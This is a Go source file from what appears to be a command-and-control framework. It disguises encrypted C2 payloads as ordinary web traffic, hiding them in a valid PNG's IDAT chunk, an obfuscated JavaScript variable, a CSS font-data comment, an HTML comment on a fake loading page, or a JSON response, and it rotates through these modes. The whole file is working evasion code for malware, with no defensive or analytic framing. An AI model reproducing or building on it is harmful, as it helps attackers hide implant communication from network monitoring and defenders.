package camouflage

import (
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"hash/crc32"
	"sync/atomic"
)

// CamouflageMode determines how C2 payloads are wrapped for HTTP transit.
type CamouflageMode int

const (
	ModePNG  CamouflageMode = iota // Valid PNG with payload in IDAT chunk
	ModeJS                         // JavaScript variable with base64 payload
	ModeCSS                        // CSS comment with base64 payload
	ModeHTML                       // HTML comment with base64 payload
	ModeAPI                        // JSON wrapper with base64 payload
	modeCount
)

// counter tracks rotation through camouflage modes.
var counter uint64

// NextMode returns the next camouflage mode in round-robin rotation.
func NextMode() CamouflageMode {
	n := atomic.AddUint64(&counter, 1)
	return CamouflageMode(n % uint64(modeCount))
}

// Wrap wraps a C2 payload in the given camouflage mode.
// Returns (wrapped_body, content_type).
func Wrap(payload []byte, mode CamouflageMode) ([]byte, string) {
	switch mode {
	case ModePNG:
		return wrapPNG(payload), "image/png"
	case ModeJS:
		return wrapJS(payload), "application/javascript"
	case ModeCSS:
		return wrapCSS(payload), "text/css"
	case ModeHTML:
		return wrapHTML(payload), "text/html"
	case ModeAPI:
		return wrapAPI(payload), "application/json"
	default:
		return wrapAPI(payload), "application/json"
	}
}

// pngChunk constructs a PNG chunk: [4-byte length][4-byte type][data][4-byte CRC].
// CRC is computed over type + data per PNG specification.
func pngChunk(chunkType string, data []byte) []byte {
	buf := make([]byte, 4+4+len(data)+4)

	// Data length (excludes type and CRC)
	binary.BigEndian.PutUint32(buf[0:4], uint32(len(data)))

	// Chunk type
	copy(buf[4:8], chunkType)

	// Chunk data
	copy(buf[8:8+len(data)], data)

	// CRC32 over type + data (PNG uses CRC-32/ISO-HDLC = IEEE polynomial)
	crc := crc32.ChecksumIEEE(buf[4 : 8+len(data)])
	binary.BigEndian.PutUint32(buf[8+len(data):], crc)

	return buf
}

// wrapPNG embeds the encrypted payload in the IDAT chunk of a valid 1x1 RGBA PNG.
func wrapPNG(payload []byte) []byte {
	// PNG file signature
	sig := []byte{0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A}

	// IHDR chunk: 1x1 pixel, 8-bit RGBA
	ihdrData := make([]byte, 13)
	binary.BigEndian.PutUint32(ihdrData[0:4], 1) // width
	binary.BigEndian.PutUint32(ihdrData[4:8], 1) // height
	ihdrData[8] = 8                              // bit depth
	ihdrData[9] = 6                              // color type: RGBA
	ihdrData[10] = 0                             // compression method
	ihdrData[11] = 0                             // filter method
	ihdrData[12] = 0                             // interlace method
	ihdr := pngChunk("IHDR", ihdrData)

	// IDAT chunk: contains AES-GCM encrypted C2 payload
	idat := pngChunk("IDAT", payload)

	// IEND chunk: image trailer
	iend := pngChunk("IEND", nil)

	// Assemble complete PNG
	out := make([]byte, 0, len(sig)+len(ihdr)+len(idat)+len(iend))
	out = append(out, sig...)
	out = append(out, ihdr...)
	out = append(out, idat...)
	out = append(out, iend...)
	return out
}

// wrapJS wraps the payload as a JavaScript variable assignment.
func wrapJS(payload []byte) []byte {
	encoded := base64.StdEncoding.EncodeToString(payload)
	js := fmt.Sprintf("var _0x=[\"%s\"];", encoded)
	return []byte(js)
}

// wrapCSS wraps the payload as a CSS font-data comment.
func wrapCSS(payload []byte) []byte {
	encoded := base64.StdEncoding.EncodeToString(payload)
	css := fmt.Sprintf("/* font-data: %s */\nbody { margin: 0; padding: 0; }", encoded)
	return []byte(css)
}

// wrapHTML embeds the payload in an HTML comment.
func wrapHTML(payload []byte) []byte {
	encoded := base64.StdEncoding.EncodeToString(payload)
	html := fmt.Sprintf("<!DOCTYPE html><html><head><title>Loading...</title></head><body><!-- %s --><p>Please wait...</p></body></html>", encoded)
	return []byte(html)
}

// wrapAPI wraps the payload as a JSON API response.
func wrapAPI(payload []byte) []byte {
	encoded := base64.StdEncoding.EncodeToString(payload)
	j := fmt.Sprintf(`{"data":"%s","status":"ok"}`, encoded)
	return []byte(j)
}
